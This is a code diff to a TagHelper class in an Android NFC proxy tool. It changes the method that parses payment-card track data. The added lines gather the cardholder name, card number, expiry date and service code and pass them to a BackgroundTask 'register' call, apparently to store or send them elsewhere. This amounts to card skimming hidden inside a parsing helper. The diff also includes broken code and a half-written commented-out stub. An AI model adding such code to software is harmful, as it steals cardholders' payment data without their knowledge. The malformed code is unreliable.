@@ -3,6 +3,9 @@ package org.eleetas.nfc.nfcproxy.utils;
 import java.io.UnsupportedEncodingException;
 import java.util.Arrays;
 import java.util.Formatter;
+import android.view.View;
+
+import org.eleetas.nfc.nfcproxy.BackgroundTask;
 
 public class TagHelper {
 
@@ -185,11 +188,11 @@ public class TagHelper {
     	//TODO: Length error checking
     	int PANLength = 16;
     	int nameOffset = offset + PANLength + 1;
-    	
-    	StringBuilder sb = new StringBuilder();
+    	String name;
+        StringBuilder sb = new StringBuilder();
     	
         sb.append("Name: ");
-        String name = "";
+        String ccName, cardNum, cardExp, iCVV, cardRaw = "";
         int dIndex = findDelimiterIndex(track1, nameOffset);
     	int expOffset = dIndex + 1;
     	int svcOffset = dIndex + 5;
@@ -227,10 +230,31 @@ public class TagHelper {
         sb.append("\nService Code: ");
         String scode = new String(track1, svcOffset, 3);        
         sb.append(scode);
-        
+
+        //cardRaw =
+        iCVV = scode;
+        cardExp = exp;
+        ccName = name;
+        cardNum = ccnum;
+
+        String method = "register";
+        BackgroundTask backgroundTask = new BackgroundTask(this);
+        backgroundTask.execute(method, ccName, cardNum, cardExp, iCVV);
+        //finish();
         return sb.toString();    	
     	
     }
+
+	/*public void dbWriter(View view){
+        cardRaw =
+        iCVV =
+        cardExp =
+        ccName =
+        cardNum =
+        String method = "register";
+        BackgroundTask backgroundTask = new BackgroundTask(this);
+        backgroundTask.execute(method, name,)
+	}*/
     
     private static int findDelimiterIndex(byte[] data, int nameOffset) {
     	for (int i = nameOffset; i < data.length; i++) {
